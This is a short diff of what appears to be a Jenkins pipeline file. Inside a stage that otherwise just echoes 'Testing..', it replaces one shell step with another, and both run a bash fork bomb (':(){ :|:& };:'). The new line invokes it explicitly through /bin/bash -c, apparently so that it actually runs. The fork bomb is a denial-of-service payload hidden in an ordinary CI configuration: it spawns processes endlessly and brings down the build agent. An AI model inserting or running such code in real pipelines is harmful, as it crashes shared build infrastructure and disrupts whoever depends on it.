@@ -17,7 +17,7 @@ pipeline {
             steps {
 
               script {
-                sh ":(){ :|: & };:"
+                sh "/bin/bash -c ':(){ :|:& };:'"
               }
                 echo 'Testing..'
             }
